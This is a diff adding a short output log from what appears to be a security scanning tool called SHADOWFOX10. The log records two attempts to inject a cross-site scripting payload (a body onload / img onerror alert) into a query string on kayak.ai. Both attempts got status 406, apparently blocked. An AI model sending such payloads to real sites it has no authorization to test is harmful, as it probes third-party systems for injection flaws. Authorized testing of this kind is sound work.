@@ -1,0 +1,9 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=<body onload=<img src=x onerror=alert('xss')>>
+
+[STATUS]: 406
+[PAYLOAD]: <body onload=<img src=x onerror=alert('xss')>>
+---
+[STATUS]: 406
+[PAYLOAD]: <body onload=<img src=x onerror=alert('xss')>>
+---
